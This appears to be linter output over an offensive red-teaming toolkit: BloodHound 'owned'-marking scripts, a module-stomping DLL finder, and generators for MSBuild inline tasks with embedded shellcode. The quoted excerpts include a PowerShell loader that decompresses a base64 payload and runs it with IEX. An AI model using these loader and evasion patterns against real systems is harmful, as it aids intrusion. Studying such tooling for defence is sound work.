SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:67:12
   |
65 |         conditionList.append(f'u.name = "{node}"')
66 |
67 |         if node not in results.keys():
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
68 |             results[node] = {
69 |                 "name": node,
   |
help: Remove `.keys()`

N806 Variable `interimResults` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:75:5
   |
74 |     condition = " OR ".join(conditionList)
75 |     interimResults = {}
   |     ^^^^^^^^^^^^^^
76 |
77 |     for node in nodes:
   |

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:114:13
    |
112 |         output = ""
113 |
114 |         for k, v in interimResults.items():
    |             ^
115 |             if config["include_group_delegated"]:
116 |                 output += f"{v['name']},{v['first-degree']},{v['group-delegated']}\n"
    |
help: Rename unused `k` to `_k`

N806 Variable `nodesFile` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:184:5
    |
182 |     args = opts(argv)
183 |
184 |     nodesFile = args.nodesList
    |     ^^^^^^^^^
185 |
186 |     programStart = time.time()
    |

N806 Variable `programStart` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:186:5
    |
184 |     nodesFile = args.nodesList
185 |
186 |     programStart = time.time()
    |     ^^^^^^^^^^^^
187 |
188 |     if not os.path.isfile(nodesFile):
    |

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:198:20
    |
196 |                 continue
197 |
198 |             if not "@" in x:
    |                    ^^^^^^^^
199 |                 raise Exception(
200 |                     'Node names must include "@" and be in form: NAME@DOMAIN !'
    |
help: Convert to `not in`

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:216:5
    |
214 |         return False
215 |
216 |     finishEta = 0.0
    |     ^^^^^^^^^
217 |     totalTime = 0.0
218 |     runs = 0
    |

N806 Variable `totalTime` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:217:5
    |
216 |     finishEta = 0.0
217 |     totalTime = 0.0
    |     ^^^^^^^^^
218 |     runs = 0
    |

SIM108 Use ternary operator `columns = columns2 if config["include_group_delegated"] else columns1` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:228:13
    |
226 |               output = ""
227 |
228 | /             if config["include_group_delegated"]:
229 | |                 columns = columns2
230 | |             else:
231 | |                 columns = columns1
    | |__________________________________^
232 |
233 |               if config["output"] != "":
    |
help: Replace `if`-`else`-block with `columns = columns2 if config["include_group_delegated"] else columns1`

N806 Variable `totalTime` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:244:17
    |
242 |                 stop = time.time()
243 |
244 |                 totalTime += stop - start
    |                 ^^^^^^^^^
245 |                 runs += 1
    |

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:247:17
    |
245 |                 runs += 1
246 |
247 |                 finishEta = ((len(nodes) / nodesToCheckPerStep) - runs) * (
    |                 ^^^^^^^^^
248 |                     totalTime / float(runs)
249 |                 )
    |

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:252:21
    |
251 |                 if finishEta < 0:
252 |                     finishEta = 0
    |                     ^^^^^^^^^
253 |
254 |                 log(
    |

N806 Variable `programStop` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:264:5
    |
263 |     driver.close()
264 |     programStop = time.time()
    |     ^^^^^^^^^^^
265 |
266 |     log(f"\n[+] Nodes checked in {programStop - programStart:.3f} seconds.")
    |

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:271:13
    |
269 |         print(columns)
270 |
271 |         for k, v in results.items():
    |             ^
272 |             if config["include_group_delegated"]:
273 |                 output += f"{v['name']},{v['first-degree']},{v['group-delegated']}\n"
    |
help: Rename unused `k` to `_k`

N816 Variable `numberOfNodesToAddPerStep` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:45:1
   |
43 | # about running out of heap memory space (java...).
44 | #
45 | numberOfNodesToAddPerStep = 500
   | ^^^^^^^^^^^^^^^^^^^^^^^^^
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:94:101
   |
92 |         print(
93 |             """
94 |     Takes a file containing node names on input and marks them as Owned in specified neo4j database.     
   |                                                                                                     ^^^^^
95 |
96 | Usage:  ./markNodesOwned.py <nodes-file>
   |
help: Remove trailing whitespace

N806 Variable `nodesFile` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:102:5
    |
101 |     args = opts(argv)
102 |     nodesFile = args.nodesList
    |     ^^^^^^^^^
103 |
104 |     programStart = time.time()
    |

N806 Variable `programStart` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:104:5
    |
102 |     nodesFile = args.nodesList
103 |
104 |     programStart = time.time()
    |     ^^^^^^^^^^^^
105 |
106 |     if not os.path.isfile(nodesFile):
    |

F821 Undefined name `log`
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:107:9
    |
106 |     if not os.path.isfile(nodesFile):
107 |         log(f'[!] Input file containing nodes does not exist: "{nodesFile}"!')
    |         ^^^
108 |         return False
    |

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:116:20
    |
114 |                 continue
115 |
116 |             if not "@" in x:
    |                    ^^^^^^^^
117 |                 raise Exception(
118 |                     'Node names must include "@" and be in form: NAME@DOMAIN !'
    |
help: Convert to `not in`

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:143:5
    |
141 |         print()
142 |
143 |     finishEta = 0.0
    |     ^^^^^^^^^
144 |     totalTime = 0.0
145 |     runs = 0
    |

N806 Variable `totalTime` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:144:5
    |
143 |     finishEta = 0.0
144 |     totalTime = 0.0
    |     ^^^^^^^^^
145 |     runs = 0
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:147:11
    |
145 |     runs = 0
146 |
147 |     print("[+] To be marked: {} nodes.".format(len(nodes)))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
148 |
149 |     try:
    |
help: Convert to f-string

N806 Variable `totalTime` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:158:17
    |
156 |                 stop = time.time()
157 |
158 |                 totalTime += stop - start
    |                 ^^^^^^^^^
159 |                 runs += 1
    |

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:161:17
    |
159 |                 runs += 1
160 |
161 |                 finishEta = ((len(nodes) / numberOfNodesToAddPerStep) - runs) * (
    |                 ^^^^^^^^^
162 |                     totalTime / float(runs)
163 |                 )
    |

N806 Variable `finishEta` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:165:21
    |
163 |                 )
164 |                 if finishEta < 0:
165 |                     finishEta = 0
    |                     ^^^^^^^^^
166 |
167 |                 print(
    |

N806 Variable `programStop` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\bloodhound\markNodesOwned.py:177:5
    |
176 |     driver.close()
177 |     programStop = time.time()
    |     ^^^^^^^^^^^
178 |     print(
179 |         f"\n[+] Nodes marked as owned successfully in {programStop - programStart:.3f} seconds."
    |

F401 [*] `re` imported but unused
  --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:28:8
   |
26 | import platform
27 | import pprint
28 | import re
   |        ^^
29 | import subprocess
30 | import sys
   |
help: Remove unused import: `re`

N816 Variable `processModules` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:59:1
   |
57 | is_wow64 = False
58 | results = []
59 | processModules = {}
   | ^^^^^^^^^^^^^^
60 | filesProcessed = 0
   |

N816 Variable `filesProcessed` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:60:1
   |
58 | results = []
59 | processModules = {}
60 | filesProcessed = 0
   | ^^^^^^^^^^^^^^
   |

N806 Variable `hollowSize` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:114:5
    |
112 | def getHollowSize(pe):
113 |     ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
114 |     hollowSize = 0
    |     ^^^^^^^^^^
115 |
116 |     for sect in pe.sections:
    |

N806 Variable `hollowSize` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:120:13
    |
118 |             sect.VirtualAddress + sect.Misc_VirtualSize
119 |         ):
120 |             hollowSize = sect.VirtualAddress + sect.Misc_VirtualSize - ep
    |             ^^^^^^^^^^
121 |             break
    |

N806 Variable `hollowSize` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:124:9
    |
123 |     if hollowSize == 0:
124 |         hollowSize = (
    |         ^^^^^^^^^^
125 |             pe.sections[0].VirtualAddress + pe.sections[0].Misc_VirtualSize - ep
126 |         )
    |

N806 Variable `hollowSize` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:129:9
    |
128 |     if hollowSize < 0:
129 |         hollowSize = 0
    |         ^^^^^^^^^^
130 |
131 |     return hollowSize
    |

E402 Module level import not at top of file
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:134:1
    |
134 | import pefile
    | ^^^^^^^^^^^^^
    |

F811 [*] Redefinition of unused `pefile` from line 34
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:134:8
    |
134 | import pefile
    |        ^^^^^^ `pefile` redefined here
    |
   ::: security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:34:8
    |
 32 | import textwrap
 33 |
 34 | import pefile
    |        ------ previous definition of `pefile` here
 35 | import psutil
 36 | import tabulate
    |
help: Remove definition: `pefile`

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:182:13
    |
180 |         # but is straightforward to just open the file again
181 |         # as a file object
182 |         f = open(fname, "rb")
    |             ^^^^
183 |         # move to the beginning of signature table
184 |         f.seek(sigoff)
    |

N806 Variable `CREATE_NO_WINDOW` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:205:5
    |
204 | def shell(cmd):
205 |     CREATE_NO_WINDOW = 0x08000000
    |     ^^^^^^^^^^^^^^^^
206 |     timeout = 10
207 |     si = subprocess.STARTUPINFO()
    |

F841 Local variable `errs` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:223:5
    |
222 |     outs = out.stdout
223 |     errs = out.stderr
    |     ^^^^
224 |
225 |     return outs.decode(errors="ignore").strip()
    |
help: Remove assignment to unused variable `errs`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:231:16
    |
229 |     sign = extractPKCS7(fname)
230 |
231 |     if sign != None and len(sign) > 0:
    |                ^^^^
232 |         f = tempfile.NamedTemporaryFile(delete=False)
233 |         f.write(sign)
    |
help: Replace with `cond is not None`

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:232:13
    |
231 |     if sign != None and len(sign) > 0:
232 |         f = tempfile.NamedTemporaryFile(delete=False)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
233 |         f.write(sign)
234 |         f.close()
    |

N806 Variable `posA` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:255:21
    |
253 |                 if "subject: " in line.lower():
254 |                     org = ", O="
255 |                     posA = line.find(org)
    |                     ^^^^
256 |                     posB = line.find(",", posA + 1)
    |

N806 Variable `posB` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:256:21
    |
254 |                     org = ", O="
255 |                     posA = line.find(org)
256 |                     posB = line.find(",", posA + 1)
    |                     ^^^^
257 |
258 |                     if posA + len(org) >= posB:
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:290:29
    |
288 |                 processModules[pid]["modules"].append(dll.path)
289 |
290 |         except Exception as e:
    |                             ^
291 |             if pid in processModules.keys():
292 |                 del processModules[pid]
    |
help: Remove assignment to unused variable `e`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:291:16
    |
290 |         except Exception as e:
291 |             if pid in processModules.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
292 |                 del processModules[pid]
    |
help: Remove `.keys()`

N806 Variable `usedBy` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:298:5
    |
297 | def findProcessesWithModuleLoaded(path):
298 |     usedBy = set()
    |     ^^^^^^
299 |
300 |     for pid in processModules.keys():
    |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:300:9
    |
298 |     usedBy = set()
299 |
300 |     for pid in processModules.keys():
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
301 |         for dll in processModules[pid]["modules"]:
302 |             if path.lower() == dll.lower():
    |
help: Remove `.keys()`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:319:5
    |
317 |     try:
318 |         mod = pefile.PE(path, fast_load=True)
319 |     except:
    |     ^^^^^^
320 |         return
    |

N806 Variable `inSystem32` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:322:5
    |
320 |         return
321 |
322 |     inSystem32 = False
    |     ^^^^^^^^^^
323 |     inSysWOW64 = False
    |

N806 Variable `inSysWOW64` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:323:5
    |
322 |     inSystem32 = False
323 |     inSysWOW64 = False
    |     ^^^^^^^^^^
324 |
325 |     inSystem32 = os.path.isfile(
    |

N806 Variable `inSystem32` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:325:5
    |
323 |     inSysWOW64 = False
324 |
325 |     inSystem32 = os.path.isfile(
    |     ^^^^^^^^^^
326 |         os.path.join(
327 |             os.path.join(
    |

SIM112 Use capitalized environment variable `SYSTEMROOT` instead of `SystemRoot`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:328:28
    |
326 |         os.path.join(
327 |             os.path.join(
328 |                 os.environ["SystemRoot"], "SysNative" if is_wow64 else "System32"
    |                            ^^^^^^^^^^^^
329 |             ),
330 |             os.path.basename(path),
    |
help: Replace `SystemRoot` with `SYSTEMROOT`

N806 Variable `inSysWOW64` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:333:5
    |
331 |         )
332 |     )
333 |     inSysWOW64 = os.path.isfile(
    |     ^^^^^^^^^^
334 |         os.path.join(
335 |             os.path.join(
    |

SIM112 Use capitalized environment variable `SYSTEMROOT` instead of `SystemRoot`
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:336:28
    |
334 |         os.path.join(
335 |             os.path.join(
336 |                 os.environ["SystemRoot"], "SysWOW64" if not is_wow64 else "System32"
    |                            ^^^^^^^^^^^^
337 |             ),
338 |             os.path.basename(path),
    |
help: Replace `SystemRoot` with `SYSTEMROOT`

N806 Variable `MaxWidth` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:365:5
    |
364 |     row = []
365 |     MaxWidth = 40
    |     ^^^^^^^^
366 |
367 |     for h in headers:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:370:12
    |
368 |         obj = None
369 |
370 |         if type(infos[h]) == set or type(infos[h]) == list or type(infos[h]) == tuple:
    |            ^^^^^^^^^^^^^^^^^^^^^
371 |             obj = ", ".join(infos[h])
372 |         else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:370:37
    |
368 |         obj = None
369 |
370 |         if type(infos[h]) == set or type(infos[h]) == list or type(infos[h]) == tuple:
    |                                     ^^^^^^^^^^^^^^^^^^^^^^
371 |             obj = ", ".join(infos[h])
372 |         else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:370:63
    |
368 |         obj = None
369 |
370 |         if type(infos[h]) == set or type(infos[h]) == list or type(infos[h]) == tuple:
    |                                                               ^^^^^^^^^^^^^^^^^^^^^^^
371 |             obj = ", ".join(infos[h])
372 |         else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:375:12
    |
373 |             obj = infos[h]
374 |
375 |         if type(obj) == str and len(obj) > MaxWidth:
    |            ^^^^^^^^^^^^^^^^
376 |             obj = "\n".join(textwrap.wrap(obj, width=MaxWidth))
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:380:5
    |
378 |         row.append(obj)
379 |
380 |     appendRow = True
    |     ^^^^^^^^^
381 |
382 |     #
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:386:9
    |
384 |     #
385 |     if args.min_code_size > 0 and infos["code size"] < args.min_code_size:
386 |         appendRow = False
    |         ^^^^^^^^^
387 |         verbose(
388 |             f'\tFile {infos["filename"]} not added as it\'s code section size is less than requested ({infos["code size"]} < {args.miΓÇª
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:392:9
    |
391 |     if args.min_file_size > 0 and infos["file size"] < args.min_file_size:
392 |         appendRow = False
    |         ^^^^^^^^^
393 |         verbose(
394 |             f'\tFile {infos["filename"]} not added as it\'s file size is less than requested ({infos["file size"]} < {args.min_file_sΓÇª
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:398:9
    |
397 |     if args.min_image_size > 0 and infos["image size"] < args.min_image_size:
398 |         appendRow = False
    |         ^^^^^^^^^
399 |         verbose(
400 |             f'\tFile {infos["filename"]} not added as it\'s image size is less than requested ({infos["image size"]} < {args.min_imagΓÇª
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:404:9
    |
403 |     if args.hollow_size > 0 and infos["hollow size"] < args.hollow_size + 16:
404 |         appendRow = False
    |         ^^^^^^^^^
405 |         verbose(
406 |             f'\tFile {infos["filename"]} not added as it\'s room for Module Stomping/Hollowing is less than requested ({infos["hollowΓÇª
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:410:9
    |
409 |     if args.used and len(infos["used by"]) == 0:
410 |         appendRow = False
    |         ^^^^^^^^^
411 |         verbose(
412 |             f"\tFile {infos['filename']} not added as it was not used by any process during the scan."
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:416:9
    |
415 |     if args.not_used and len(infos["used by"]) != 0:
416 |         appendRow = False
    |         ^^^^^^^^^
417 |         verbose(
418 |             f"\tFile {infos['filename']} not added as it was used by any process during the scan."
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:422:9
    |
421 |     if args.dotnet and not infos[".NET"]:
422 |         appendRow = False
    |         ^^^^^^^^^
423 |         verbose(f"\tFile {infos['filename']} not added as it was not a .NET assembly.")
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:426:9
    |
425 |     if args.signed and len(infos["signed"]) == 0:
426 |         appendRow = False
    |         ^^^^^^^^^
427 |         verbose(f"\tFile {infos['filename']} not added as it was not code signed.")
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:430:9
    |
429 |     if args.unsigned and len(infos["signed"]) > 0:
430 |         appendRow = False
    |         ^^^^^^^^^
431 |         verbose(f"\tFile {infos['filename']} not added as it was not unsigned.")
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:436:9
    |
434 |         not infos["in System32"] or not infos["in SysWOW64"]
435 |     ):
436 |         appendRow = False
    |         ^^^^^^^^^
437 |         verbose(
438 |             f"\tFile {infos['filename']} not added as it was not present in System32 and SysWOW64 at the same time."
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:442:9
    |
441 |     if len(args.process) > 0 and args.process not in infos["used by"]:
442 |         appendRow = False
    |         ^^^^^^^^^
443 |         verbose(
444 |             f"\tFile {infos['filename']} not added as it was not used by process {args.process}."
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:594:1
    |
592 |     :: stomp-dll-info.py - Your Module Stomping / DLL Hollowing candidates headhunter!
593 |     A script that scans, filters, analyzes DLL files displaying viable candidates for module stomping.
594 |     
    | ^^^^
595 |     Mariusz Banach / mgeeky, '21
596 |     <mb [at] binary-offensive.com> 
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:596:35
    |
595 |     Mariusz Banach / mgeeky, '21
596 |     <mb [at] binary-offensive.com> 
    |                                   ^
597 | """
598 |     )
    |
help: Remove trailing whitespace

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\red-teaming\cobalt-arsenal\stomp-dll-info.py:634:21
    |
633 |             if args.first > 0:
634 |                 for i in range(len(results) - args.first):
    |                     ^
635 |                     results.pop()
    |
help: Rename unused `i` to `_i`

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\compressedPowershell.py:24:18
   |
22 |           encoded = base64.b64encode(out.getvalue())
23 |
24 |       powershell = """$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String("{}"));
   |  __________________^
25 | |
26 | | IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"ΓÇª
27 | |         encoded.decode()
28 | |     )
   | |_____^
29 |
30 |       print(powershell)
   |
help: Convert to f-string

F401 [*] `binascii` imported but unused
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:20:8
   |
18 | import argparse
19 | import base64
20 | import binascii
   |        ^^^^^^^^
21 | import gzip
22 | import io
   |
help: Remove unused import: `binascii`

F401 [*] `struct` imported but unused
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:27:8
   |
25 | import re
26 | import string
27 | import struct
   |        ^^^^^^
28 | import sys
   |
help: Remove unused import: `struct`

N803 Argument name `filePath` should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:33:26
   |
33 | def getCompressedPayload(filePath, returnRaw=False):
   |                          ^^^^^^^^
34 |     out = io.BytesIO()
35 |     encoded = ""
   |

N803 Argument name `returnRaw` should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:33:36
   |
33 | def getCompressedPayload(filePath, returnRaw=False):
   |                                    ^^^^^^^^^^^^^^^
34 |     out = io.BytesIO()
35 |     encoded = ""
   |

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:46:18
   |
44 |               return encoded
45 |
46 |       powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.ΓÇª
   |  __________________^
47 | |         encoded.decode()
48 | |     )
   | |_____^
49 |       return powershell
   |
help: Convert to f-string

N806 Variable `payloadCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:55:5
   |
53 |     return f'shellcode = "{payload}";'
54 |
55 |     payloadCode = "\n"
   |     ^^^^^^^^^^^
56 |
57 |     N = 50000
   |

N806 Variable `N` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:57:5
   |
55 |     payloadCode = "\n"
56 |
57 |     N = 50000
   |     ^
58 |     codeSlices = map(lambda i: payload[i : i + N], range(0, len(payload), N))
   |

N806 Variable `codeSlices` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:58:5
   |
57 |     N = 50000
58 |     codeSlices = map(lambda i: payload[i : i + N], range(0, len(payload), N))
   |     ^^^^^^^^^^
59 |
60 |     variables = []
   |

C417 Unnecessary `map()` usage (rewrite using a generator expression)
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:58:18
   |
57 |     N = 50000
58 |     codeSlices = map(lambda i: payload[i : i + N], range(0, len(payload), N))
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
59 |
60 |     variables = []
   |
help: Replace `map()` with a generator expression

N806 Variable `payloadCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:64:9
   |
62 |     num = 1
63 |     for code in codeSlices:
64 |         payloadCode += f'string shellcode{num} = "{code}";\n'
   |         ^^^^^^^^^^^
65 |         variables.append(f"shellcode{num}")
66 |         num += 1
   |

N806 Variable `payloadCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:69:5
   |
68 |     concat = "shellcode = " + " + ".join(variables) + ";\n"
69 |     payloadCode += concat
   |     ^^^^^^^^^^^
70 |
71 |     return payloadCode
   |

N803 Argument name `targetProcess` should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:74:50
   |
74 | def getInlineTask(module, payload, _format, apc, targetProcess):
   |                                                  ^^^^^^^^^^^^^
75 |     templateName = "".join(
76 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
   |

N806 Variable `templateName` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:75:5
   |
74 | def getInlineTask(module, payload, _format, apc, targetProcess):
75 |     templateName = "".join(
   |     ^^^^^^^^^^^^
76 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
77 |     )
   |

N806 Variable `templateName` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:79:9
   |
77 |     )
78 |     if len(module) > 0:
79 |         templateName = module
   |         ^^^^^^^^^^^^
80 |
81 |     taskName = "".join(
   |

N806 Variable `taskName` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:81:5
   |
79 |         templateName = module
80 |
81 |     taskName = "".join(
   |     ^^^^^^^^
82 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
83 |     )
   |

N806 Variable `payloadCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:85:5
   |
83 |     )
84 |
85 |     payloadCode = getPayloadCode(payload.decode())
   |     ^^^^^^^^^^^
86 |     launchCode = ""
   |

N806 Variable `launchCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:86:5
   |
85 |     payloadCode = getPayloadCode(payload.decode())
86 |     launchCode = ""
   |     ^^^^^^^^^^
87 |
88 |     if _format == "exe":
   |

N806 Variable `exeLaunchCode` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:90:9
   |
88 |     if _format == "exe":
89 |
90 |         exeLaunchCode = string.Template(
   |         ^^^^^^^^^^^^^
91 |             """<Task>
92 |       <Reference Include="System.Management.Automation" />
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:94:18
   |
92 |       <Reference Include="System.Management.Automation" />
93 |       <Code Type="Class" Language="cs">
94 |         <![CDATA[       
   |                  ^^^^^^^
95 |             using System.Management.Automation;
96 |             using System.Management.Automation.Runspaces;
   |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:131:80
    |
129 |                     MethodInfo method = asm.EntryPoint;
130 |                     object instance = asm.CreateInstance(method.Name);
